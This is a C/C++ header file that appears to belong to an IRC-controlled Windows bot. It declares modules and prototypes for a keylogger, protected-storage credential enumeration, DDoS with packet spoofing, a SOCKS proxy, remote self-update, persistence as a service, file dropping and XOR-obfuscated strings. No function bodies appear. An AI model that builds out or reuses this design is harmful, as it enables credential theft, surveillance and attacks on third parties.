#define WIN32_LEAN_AND_MEAN		
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_DEPRECATE
#define _WINSOCK_DEPRECATED_NO_WARNINGS


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#include <fcntl.h>
#include <time.h>
#include <Winsock2.h>
#include <string.h>
#include <conio.h>
#include <Lmcons.h>
#include <Wininet.h>
#include <psapi.h>
#include <comdef.h>

#include "configuration.h"
#include "host_conf.h"
#include "version.h"
#include "ssl.h"
#include "http_server.h"
#include "ftp_server.h"
#include "ddos.h"
#include "threads.h"
#include "dcc.h"
#include "capture.h"
#include "icf.h"
#ifndef BLOWINCLUDED
#include "blowfish.h"
#endif
#include "auth.h"
#include "registry.h"
#include "udp_core.h"
#include "cleanup.h"
#include "socks_core.h"
#include "udp_functions.h"
#include "memory.h"
#include "misc_inet.h"
#include "enumpstorage.h"
#include "misc.h"
#include "tcp_update.h"
#include "secure_sockets.h"
#include "keylogger.h"
#include "findfile.h"
#include "lzss.h"
#include "cmd_dns.h"
#include "consistance.h"
#include "bscs_client.h"
#include "clipboard.h"
#include "processes.h"

#ifdef FRELEASE
#define deb //
#define FORMATERROR "none"
#else
#define deb fdeb
#define FORMATERROR fmterr()
#endif

#define crypt string_hex_xor
#define decrypt xor_hex_string
#define D(s) decode_hex_string(s)

// MACRO DEFINES
#define a(s) ma(s);
#define f(s) mf(s);
#define z(s,a) ZeroMemory((void*)s,(size_t)a);

/// enumerations 
enum { OS_WIN98 = 0x10,OS_WINME,OS_WIN2K,OS_WINXP,OS_WIN2K3,OS_WIN95,OS_WINNT,OS_UNKNOWN };

// FUNCTION PROTOS

int OSVersionCheck(void);
char* GetStrOS(void);
unsigned __int64 GetCPUSpeed(void);
inline unsigned __int64 GetCycleCount(void);
char *sysinfo(char *sinfo, SOCKET sock);
char* netinfo(char *buf);
void * ma(WORD);
int mf(void*);
int GetInfo(char *buf,DWORD bufsiz);
int httponcelog (char *filename,char *msg,...);
int httlog (char *filename,char *msg,...);
int registerme(void);
WORD AlreadyHere(void);
WORD HttpUpdate(char *url);
int msg_box(char*);
DWORD WINAPI msg_box_th( LPVOID sArg1 );
DWORD WINAPI HttpUpdateThread( LPVOID url );
int recv_bytes(SOCKET s);
int GetHTTPRespCode(SOCKET s);
DWORD HttpGet(WORD threads_num,WORD time,char *url,char *out_file);
DWORD WINAPI HttpGetThread( LPVOID config );
int fast_select(SOCKET Socket,WORD timeout);
int SocksServer(WORD state,int port = NULL);
DWORD WINAPI CoreSocks( LPVOID port );
WORD IsSocketAlive(SOCKET);
WORD SystemCmd(char*,char*,DWORD);
WORD DispatchIrcCommand(char*,char*,DWORD,WORD*);
WORD IrcGetRespondValue(char* recvBuf,char* value,WORD);
int GenerateAndSendMessage(char *,DWORD,char *,SOCKET);
char* GetLocalInetAddr(void);
int ReadyToRead(SOCKET,WORD);
WORD SockRead(SOCKET,char*,WORD,WORD);
DWORD SockReadAll(SOCKET,char*,long,WORD);
int SockReadLine(SOCKET socket,char *buf,WORD bufsiz,WORD timeout);
void GetRandStr(WORD,char*);
DWORD WINAPI CoreIrc( LPVOID lpParam ) ;
DWORD WINAPI CoreIdentd( LPVOID lpParam ) ;
void fdeb(char *msg,...) ;
DWORD WINAPI ProcessSocksClient( LPVOID s );
void ircdeb(char *msg,...) ;
DWORD IdentServer(WORD,char* user = NULL);
int DnsResolve(char*);
int resolve(char* Host);
int sendkeys(char *buf,char *window);
int keylogger(int);
int mykey(WPARAM wPararam, LPARAM lPararam);
LRESULT CALLBACK KeyboardProc(int code,WPARAM wParam,LPARAM lParam);
DWORD WINAPI keysmonitor ( LPVOID nothing ) ;
int DropFile(char *fname,BYTE data[],DWORD size);
void charrep(char *buf,char c,char to);
int rep(char *buffer,char *what,char *to);
char *dumpkeys(void);
void SetSystemInfo(void);
void delservice(void);
char* fmterr(void);
char* fmterr(DWORD err);
void rawmsg(char *msg,...);
int SetUserDesktop( int mode );
void hexdump(char *buffer, int size);

DWORD WINAPI HandlerEx(DWORD dwControl,DWORD dwEventType,LPVOID lpEventData,LPVOID lpContext);
EXPORT VOID WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpszArgv);
VOID WINAPI Handler(DWORD fdwControl);
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow);
int RegisterService(char* path);

/* misc.cpp */
LONG FileAccess(char *szPath,DWORD access);
LONG BotUpdate(char *szUrl);
void SaveNick(char *nick);
int GetSavedNick(char*);
int CoreInit(void);

/* sys_related.cpp */
void WindowsControl(WORD mode);
int GetUptime(unsigned int s, int *days, int *hours, int *mins, int *secs);

/* misc_inet.cpp */
USHORT checksum(USHORT *buffer, int size);
void FillSpoofingStruct(void);
void DoDns( char *what, char *buffer);
WORD LocalIp( void );

/* irc_core.cpp */

/* toolz.cpp */
void string_hex_xor(u_char *value, u_char *result, int xor, DWORD len) ;
void xor_hex_string(u_char *value, u_char *result, int xor);
int ddos_running(void);
void SetCoreServers(char*);
void GetCoreServers(char **buffer, WORD *CoreIrcPort);